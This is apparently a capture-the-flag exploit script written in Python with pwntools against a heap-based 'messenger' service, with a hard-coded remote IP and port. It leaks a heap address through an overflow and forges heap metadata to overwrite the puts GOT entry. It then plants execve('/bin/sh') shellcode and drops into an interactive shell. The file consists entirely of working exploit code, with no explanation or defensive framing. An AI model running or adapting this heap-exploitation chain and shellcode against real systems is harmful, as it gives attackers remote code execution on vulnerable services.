#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

b = ELF('messenger')
context.log_level = 'info'
context.os = 'linux'
context.arch = 'amd64'

###

if DEBUG:
    r = process('messenger')
else:
    r = remote('110.10.212.137', 3334)

def menu():
    global r
    return r.recvuntil('>> ')

def add(size, msg):
    global r
    r.sendline('L')
    r.recvuntil('size : ')
    r.sendline(str(size))
    r.recvuntil('msg : ')
    r.send(msg)
    return menu()

def delete(idx, interac=False):
    global r
    r.sendline('R')
    r.recvuntil('index : ')
    r.sendline(str(idx))
    if interac:
        return
    return menu()

def change(idx, size, msg):
    global r
    r.sendline('C')
    r.recvuntil('index : ')
    r.sendline(str(idx))
    r.recvuntil('size : ')
    r.sendline(str(size))
    r.recvuntil('msg : ')
    r.send(msg)
    return menu()

def view(idx):
    global r
    r.sendline('V')
    r.recvuntil('index : ')
    r.sendline(str(idx))
    data = r.recvuntil('[L]')[:-3].rstrip()
    return (data, menu())

menu()
GDB = False
if GDB and REMOTE:
    gdb.attach(r, '''
    b *0x0000000000400C6D
    b *0x0000000000400B41
    ''')
add(16, 'toto')
change(0, 40, 'A' * 40) # leak top chunk to get baseHeap
leak = view(0)[0][40:]
leak = leak.ljust(8, '\x00')
leak = u64(leak)
if len(hex(leak)[2:]) < 6:
    log.info('Nullbyte inside heap addr, exploit failed')
    r.close()
    sys.exit()
log.info('leak: %#x' % leak)
baseHeap = leak - 0x18
log.info('baseHeap: %#x' % baseHeap)
heap = 'B' * 16 + p64(0) + p64(0x3d0) + p64(0)
change(0, 40, heap) # to get back to previous state, we don't fuck up the heap

add(16, 'C' * 16)
SC = asm('''
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    cdq
    push rax
    pop rsi
    mov al, 0x3b
    syscall
''')
heap  = '\x00' * 24
heap += p64(0x31)
heap += p64(b.symbols['got.puts']) # will rewrite printf got to prev
heap += p64(baseHeap + 0xa0) # prev
heap += '\x00' * 24
heap += p64(0x3a0)
heap += p64(0)
heap += p64(baseHeap + 0x48)
heap += '\x00' * 16
heap += '\xeb\x13'
heap += '\x00' * 19
heap += SC
change(0, len(heap), heap)
delete(1, True)
r.recvuntil('[Q]uit\n')
r.interactive()

r.close()
